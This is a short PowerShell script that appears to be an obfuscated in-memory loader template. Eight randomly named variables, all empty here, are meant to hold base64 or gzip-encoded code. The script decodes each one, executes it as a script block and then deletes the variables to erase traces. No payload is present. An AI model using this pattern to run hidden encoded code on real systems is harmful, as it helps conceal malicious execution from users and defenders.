#Requires -Version 2

$Sneeringly = ""
$Flourished = ""
$Councilors = ""
$Localizing = ""
$Pollinated = ""
$Hungarians = ""
$Callousing = ""
$Jocularity = ""

$Modules = @($Sneeringly,$Flourished,$Councilors,$Localizing,$Pollinated,$Hungarians,$Callousing,$Jocularity)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Sneeringly","Flourished","Councilors","Localizing","Pollinated","Hungarians","Callousing","Jocularity") | ForEach-Object { Remove-Variable -Name $_ }
